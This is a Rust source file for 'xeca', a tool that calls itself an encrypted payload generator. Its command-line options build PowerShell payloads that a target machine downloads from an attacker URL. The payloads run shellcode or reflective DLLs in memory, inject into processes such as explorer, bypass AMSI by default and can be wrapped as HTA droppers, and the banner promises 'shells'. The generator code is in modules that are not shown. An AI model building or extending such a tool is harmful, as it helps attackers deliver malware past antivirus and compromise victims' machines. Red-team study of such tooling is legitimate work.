extern crate clap;

use clap::{App, AppSettings, Arg};
use std::{env, process};

#[allow(unused_imports)]
#[macro_use] extern crate hex_literal;
pub mod util;

fn main() {
    // parse args
    let mut app = App::new("xeca")
        .version("0.2.0")
        .author("written by postrequest")
        .about("Encrypted payload generator")
        .subcommand(
            App::new("powershell")
                .about("Encrypt PowerShell payload to execute in memory")
                .version("0.2.0")
                .author("written by postrequest")
                .setting(AppSettings::ArgRequiredElseHelp)
                .arg(
                    Arg::with_name("url")
                    .long("url")
                    .takes_value(true)
                    .required(true)
                    .help("URL the target machine will download the payload from, eg: http://10.10.10.10:8080/")
                )
                .arg(
                    Arg::with_name("payload")
                    .long("payload")
                    .takes_value(true)
                    .required(true)
                    .help("PowerShell payload")
                )
                .arg(
                    Arg::with_name("disable_amsi")
                    .long("disable-amsi")
                    .help("Disable AMSI bypass in payload")
                )
                .arg(
                    Arg::with_name("generate_hta")
                    .long("generate-hta")
                    .help("Generate HTA")
                )
        )
        .subcommand(
            App::new("shellcode")
                .about("PowerShell payload to execute reflective encrypted DLL shellcode in memory")
                .version("0.2.0")
                .author("written by postrequest")
                .setting(AppSettings::ArgRequiredElseHelp)
                .arg(
                    Arg::with_name("generate_hta")
                    .long("generate-hta")
                    .requires("url")
                    .help("Generate HTA")
                )
                .arg(
                    Arg::with_name("shellcode")
                    .long("shellcode")
                    .takes_value(true)
                    .required_unless("dll")
                    .help("Shellcode to execute in memory")
                )
                .arg(
                    Arg::with_name("dll")
                    .long("dll")
                    .takes_value(true)
                    .required_unless("shellcode")
                    .requires("func_name")
                    .help("DLL to convert to shellcode and execute in memory")
                )
                .arg(
                    Arg::with_name("func_name")
                    .long("func-name")
                    .takes_value(true)
                    .help("Function name to execute")
                )
                .arg(
                    Arg::with_name("disable_amsi")
                    .long("disable-amsi")
                    .help("Disable AMSI bypass in payload")
                )
                .arg(
                    Arg::with_name("target-process")
                    .long("process")
                    .takes_value(true)
                    .help("<default: current PowerShell process> Inject shellcode into process running as current user (do not append .exe to name), eg: explorer")
                )
                .arg(
                    Arg::with_name("url")
                    .long("url")
                    .takes_value(true)
                    .required(true)
                    .help("URL the target machine will download the payload from, eg: http://10.10.10.10:8080/")
                )
        )
        .subcommand(
            App::new("reflective")
                .about("PowerShell payload to reflectively execute encrypted PE/DLL in memory")
                .version("0.2.0")
                .author("written by postrequest")
                .setting(AppSettings::ArgRequiredElseHelp)
                .arg(
                    Arg::with_name("generate_hta")
                    .long("generate-hta")
                    .requires("url")
                    .help("Generate HTA")
                )
                .arg(
                    Arg::with_name("pe or dll")
                    .long("target")
                    .takes_value(true)
                    .required(true)
                    .help("PE/DLL to execute in memory")
                )
                .arg(
                    Arg::with_name("disable_amsi")
                    .long("disable-amsi")
                    .help("Disable AMSI bypass in payload")
                )
                .arg(
                    Arg::with_name("url")
                    .long("url")
                    .takes_value(true)
                    .required(true)
                    .help("URL the target machine will download the payload from, eg: http://10.10.10.10:8080/")
                )
        )
        .subcommand(
            App::new("donut")
                .about("PowerShell payload to execute encrypted Donut shellcode in memory")
                .version("0.2.0")
                .author("written by postrequest")
                .setting(AppSettings::ArgRequiredElseHelp)
                .arg(
                    Arg::with_name("generate_hta")
                    .long("generate-hta")
                    .requires("url")
                    .help("Generate HTA")
                )
                .arg(
                    Arg::with_name("donut-shellcode")
                    .long("shellcode")
                    .takes_value(true)
                    .required(true)
                    .help("Donut shellcode to execute in memory")
                )
                .arg(
                    Arg::with_name("target-process")
                    .long("process")
                    .takes_value(true)
                    .help("<default: injects into explorer.exe> Inject shellcode into process running as current user (do not append .exe to name), eg: explorer")
                )
                .arg(
                    Arg::with_name("disable_amsi")
                    .long("disable-amsi")
                    .help("Disable AMSI bypass in payload")
                )
                .arg(
                    Arg::with_name("url")
                    .long("url")
                    .takes_value(true)
                    .required(true)
                    .help("URL the target machine will download the payload from, eg: http://10.10.10.10:8080/")
                )
        )
        .subcommand(
            App::new("convert")
                .about("Convert DLL to shellcode")
                .version("0.2.0")
                .author("written by postrequest")
                .setting(AppSettings::ArgRequiredElseHelp)
                .arg(
                    Arg::with_name("dll")
                    .long("dll")
                    .takes_value(true)
                    .required(true)
                    .requires("func_name")
                    .help("DLL to convert to shellcode")
                )
                .arg(
                    Arg::with_name("func_name")
                    .long("func-name")
                    .takes_value(true)
                    .required(true)
                    .requires("dll")
                    .help("Function name to execute")
                )
                .arg(
                    Arg::with_name("output")
                    .long("output")
                    .takes_value(true)
                    .help("Output directory")
                )
        );

    if env::args().count() < 2 {
        println!("{}", util::generator::banner());
        app.print_help().expect("Error loading help");
        println!("\n\nPlease enter commands to get shells 🐢🐢🐢");
        process::exit(1);
    }
    let matches = app.get_matches();
    match matches.subcommand() {
        ("powershell", Some(powershell_matches)) => {
            util::generator::powershell_payload(powershell_matches)
        }
        ("shellcode", Some(shellcode_matches)) => {
            util::generator::shellcode_payload(shellcode_matches)
        }
        ("reflective", Some(reflective_matches)) => {
            util::generator::reflective_payload(reflective_matches)
        }
        ("donut", Some(donut_matches)) => {
            util::generator::donut_payload(donut_matches)
        }
        ("convert", Some(convert_matches)) => {
            util::generator::convert_dll(convert_matches)
        }
        ("", None) => println!("Error handling subcommand"),
        _ => unreachable!(),
    }
    util::aes::funnies();
}
